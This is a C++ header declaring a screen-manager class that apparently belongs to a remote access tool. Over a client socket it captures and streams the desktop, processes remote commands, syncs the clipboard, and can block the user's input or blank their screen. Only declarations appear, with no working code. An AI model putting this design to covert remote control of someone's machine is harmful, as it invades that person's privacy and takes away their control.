// ScreenManager.h: interface for the newCScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include "Manager.h"
#include "newScreenSpy.h"

class newCScreenManager : public CManager  
{
public:
	newCScreenManager(CClientSocket *pClient);
	virtual ~newCScreenManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void sendBitmapInfo();
	void sendFirstScreen();
	void sendNextScreen();
	bool IsResolutionChange();
	int  GetCurrentPixelBits();
	BOOL IsConnect();
	BOOL m_bIsWorking;
	BOOL m_bIsBlockInput;
	BOOL m_bIsBlankScreen;
	LPTSTR  lpszUserSid;
private:
	BYTE	m_bAlgorithm;
	BOOL	m_bIsCaptureLayer;
	int		m_biBitCount;
	BOOL	m_bIsComposition;
	HDC		m_hDeskTopDC;
	HANDLE	m_hWorkThread, m_hCtrlThread;
	CCursorInfo	m_CursorInfo;
	newCScreenSpy	*m_pScreenSpy;
	BOOL GetAeroComposition();
	void SetAeroComposition(UINT uCompositionAction);
	void ResetScreen(int biBitCount);
	void ProcessCommand(LPBYTE lpBuffer, UINT nSize);
	void UpdateLocalClipboard(char *buf, int len);
	void SendLocalClipboard();
	static DWORD WINAPI WorkThread(LPVOID lparam);
	static DWORD WINAPI	CtrlThread(LPVOID lparam);
};

